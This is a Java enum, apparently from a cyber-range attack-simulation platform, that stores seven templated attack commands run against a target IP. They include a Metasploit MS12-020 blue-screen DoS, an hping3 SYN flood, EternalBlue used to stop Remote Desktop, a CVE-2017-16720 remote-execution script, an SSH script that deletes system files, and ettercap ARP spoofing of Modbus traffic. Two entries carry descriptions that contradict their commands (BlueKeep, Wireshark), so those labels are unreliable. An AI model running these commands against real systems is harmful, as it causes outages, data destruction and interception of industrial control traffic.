package cn.cyberpeace.mp.base.bo;

import org.apache.commons.lang3.StringUtils;

import java.util.List;

public enum AttackType {
    // 中断
    ZHONGDUAN(1, "17517000425961","中断", "", "msfconsole -q -x \"use auxiliary/dos/windows/rdp/ms12_020_maxchannelids; set RHOSTS ${ip}; run; exit\"", "死亡蓝屏（MS012-020", "构造畸形的 RDP 多通道连接请求，导致目标主机系统内存错误；最终触发蓝屏（BSOD）后系统重启。", false, "seems down"),

    // 降效
    JIANGXIAO(2, "17517000425962","降效", "", "hping3 -q -n --rand-source -S -p 80 --flood ${ip}", "Hping3 SYN flood", "发大量半连接请求造成 TCP backlog 饱和最总导致CPU使用率飙升", false, ""),

    // 嗅探
    XIUTAN(3, "17517000425963","嗅探","sniffing", "nmap ${ip}", "目标系统嗅探", "探查目标服务器开放服务端口", false, "Nmap done:"),

    //操控
    CAOKONG(4, "17517000425964","操控","", "python3 CVE-2017-16720.py ${ip}", "Advantech WebAccess 远程命令执行漏洞", "远程控制目标主机打开计算器calc.exe。", false, ""),

    //瘫毁
    TANHUI(5, "17517000425965","瘫毁","destroyed", "./auto-destory.exp ${ip} ${username} ${password}", "CVE-2019-0708（BlueKeep）", "利用SSH弱密码登录Centos操作系统,删除目标机器系统文件，造成系统瘫痪", false, ""),

    //欺骗
    QIPIAN(6, "17517000425966","欺骗","deception", "ettercap -T -F modbus.ef -q -M ARP:remote -w /tmp/network.pcap //192.168.1.89/502 //${ip}/", "ettercap中间人攻击", "利用ettercap进行ARP欺骗，通过脚本识别到modbus协议流量中含有你设定的流量特征来进行更改，可以通过攻击机与目标主机的流量特征来判断效果，还可以攻击时通过登录modbuscan_202507031516靶标观察信号灯的变化", true, ""),

    //拒止
    JUZHI(7, "17517000425967","拒止","denial-of-service-attack", "msfconsole -q -x \"use windows/smb/ms17_010_eternalblue; set RHOSTS ${ip}; set PAYLOAD windows/x64/exec;set CMD 'net stop termservice /Y';run;exit;\" ", "Wireshark 'add_capabilities()'函数远程拒绝服务漏洞", "利用Windows操作系统的MS17-010漏洞停止目标机器远程桌面服务,造成正常用户无法访问该服务。", false, "");

    private int type;

    private String toolId;

    private String category;

    private String flowType;

    private String cmd;

    private String attackDesc;

    private String attackExpectedEffect;

    private Boolean needManualCheckAttackEffect;

    private String successContent;

    AttackType(int type, String toolId, String category, String flowType,String cmd, String attackDesc,
               String attackExpectedEffect, Boolean needManualCheckAttackEffect, String successContent) {
        this.type = type;
        this.toolId = toolId;
        this.category = category;
        this.cmd = cmd;
        this.flowType = flowType;
        this.attackDesc = attackDesc;
        this.attackExpectedEffect = attackExpectedEffect;
        this.needManualCheckAttackEffect = needManualCheckAttackEffect;
        this.successContent = successContent;
    }

    public String getCategory() {
        return category;
    }

    public String getToolId() {
        return toolId;
    }

    public String getAttackDesc() {
        return attackDesc;
    }

    public String getAttackExpectedEffect() {
        return attackExpectedEffect;
    }

    public Boolean commandSuccess(String commandOutput) {
        if (StringUtils.isNotEmpty(this.getSuccessContent())) {
            if (StringUtils.isNotEmpty(commandOutput)) {
                return commandOutput.contains(this.getSuccessContent());
            } else {
                return false;
            }
        } else {
            return true;
        }
    }

    public Boolean getNeedManualCheckAttackEffect() {
        return needManualCheckAttackEffect;
    }

    public int getType() {
        return type;
    }

    public String getCmd() {
        return cmd;
    }

    public String getFlowType() {
        return flowType;
    }

    public String getSuccessContent() {
        return successContent;
    }

    public static AttackType getByType(int type) {
        for (AttackType value : values()) {
            if (value.type == type) {
                return value;
            }
        }
        return null;
    }

    public static String getFormatCmd(int type, List<ImageToolRequest.Params> params) {
        String cmd = getByType(type).getCmd();
        for(var p:params){
            cmd = cmd.replace("${" + p.getName() + "}", p.getValue());
        }
        return cmd;
    }
}
